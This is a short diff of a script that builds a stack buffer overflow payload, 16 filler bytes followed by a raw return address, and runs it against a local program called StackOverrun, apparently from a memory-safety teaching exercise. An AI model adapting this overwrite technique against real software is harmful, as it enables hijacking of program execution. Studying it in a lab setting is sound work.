@@ -1,5 +1,4 @@
-$arg = "111111111111111111"."\x30\xfd";
-$cmd = "./out/StackOverrun ".$arg;
+$arg = "ABCDEFGHIJKLMNOP"."\x90\x11\x40";
+$cmd = "out/StackOverrun ".$arg;
 
 system($cmd);
-
